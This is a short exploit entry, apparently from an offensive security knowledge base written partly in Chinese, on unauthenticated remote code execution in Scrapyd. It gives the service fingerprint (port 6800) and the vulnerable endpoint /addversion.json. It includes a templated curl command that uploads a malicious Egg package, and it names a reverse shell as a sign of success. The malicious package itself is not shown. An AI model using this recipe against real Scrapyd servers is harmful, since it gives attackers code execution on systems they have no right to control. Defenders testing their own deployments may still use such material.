# Scrapyd Unauthenticated RCE (scrapyd-unacc)

## 指纹特征
- 服务: Scrapyd
- 端口: 6800 (JSON API)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| API 部署恶意 Egg 包 | `/addversion.json` | 无 |

## PoC 指令

通过 API 上传包含恶意逻辑的 Egg 包实现代码执行：

```bash
# 上传 Egg 包
curl http://{{TARGET}}:6800/addversion.json -F project={{PROJECT}} -F version={{VERSION}} -F egg=@{{EGG_FILE}}
```

## Success Signal
- **状态验证**: 接口返回上传成功的 JSON 信息。
- **物理验证**: 恶意代码成功在服务端运行 (如反弹 Shell)。
